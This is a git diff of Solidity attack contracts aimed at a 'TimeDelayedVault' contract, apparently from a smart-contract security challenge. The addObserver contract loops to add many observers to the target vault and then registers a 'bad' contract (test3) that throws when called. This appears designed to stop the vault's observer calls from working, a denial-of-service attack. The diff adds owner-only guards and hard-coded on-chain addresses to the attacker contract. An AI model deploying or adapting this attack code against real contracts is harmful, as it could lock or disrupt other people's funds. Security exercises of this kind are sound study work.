@@ -219,28 +219,37 @@ contract test2{//not throw error
     function observe(){
     }
 }
-contract test3{//throw error
+contract test3{//throw error //blockchain 0xba0e8d1f9673bd836e2c88e22b773caac57c356f
 }
 
 //add many observers to other group 
-contract addObserver{
+contract addObserver{ //blockchain 0xda8a05f20f474b28e937c003dc6c0c09bb54017b
     address public target;
-    address public badContract;
+    address public badContract = 0xba0e8d1f9673bd836e2c88e22b773caac57c356f;
     uint public loopLimit = 1;
     uint public offset = 0;
-    function setTarget(address _target) {
+    address public ownerLALALA;
+    
+    modifier onlyOwner() {
+        require(msg.sender == ownerLALALA);
+        _;
+    }
+    function addObserver() onlyOwner{
+        ownerLALALA = msg.sender;
+    }
+    function setTarget(address _target) onlyOwner{
         target = _target;
     }
-    function setLimit(uint _limit){
+    function setLimit(uint _limit) onlyOwner{
         loopLimit = _limit;
     }
-    function setOffset(uint _offset){
+    function setOffset(uint _offset) onlyOwner{
         offset = _offset;
     }
-    function setBadContract(address _addr){
+    function setBadContract(address _addr) onlyOwner{
         badContract = _addr;
     }
-    function addManyOb() {
+    function addManyOb() onlyOwner {
         TimeDelayedVault ct = TimeDelayedVault(target);
 
         for(uint i=1;i<=loopLimit;i++){
@@ -248,11 +257,11 @@ contract addObserver{
         }
         offset += loopLimit;
     }
-    function addLastOb(){// add a bad address 
+    function addLastOb() onlyOwner{// add a bad address 
         TimeDelayedVault ct = TimeDelayedVault(target);
         ct.setObserver(badContract);    
     }
-    function reset(){
+    function reset() onlyOwner{
         target = 0x0;
         loopLimit = 1;
         offset = 0;
